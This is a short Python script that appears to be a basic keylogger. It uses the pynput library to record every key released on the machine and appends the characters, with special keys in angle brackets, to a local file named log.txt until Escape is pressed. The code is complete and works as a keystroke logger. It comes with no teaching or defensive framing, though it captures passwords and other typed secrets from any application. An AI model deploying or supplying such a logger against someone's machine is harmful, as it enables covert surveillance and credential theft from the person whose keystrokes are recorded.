from pynput.keyboard import Listener, Key

def createFile(text):
    with open('log.txt', 'a') as file:
        file.write(text)

def writeFile(text):
    try:
        createFile(text.char)

    except AttributeError:
        createFile(f' <{text}> ')

    if text == Key.esc:
        return False

with Listener(on_release = writeFile) as listener:
    listener.join()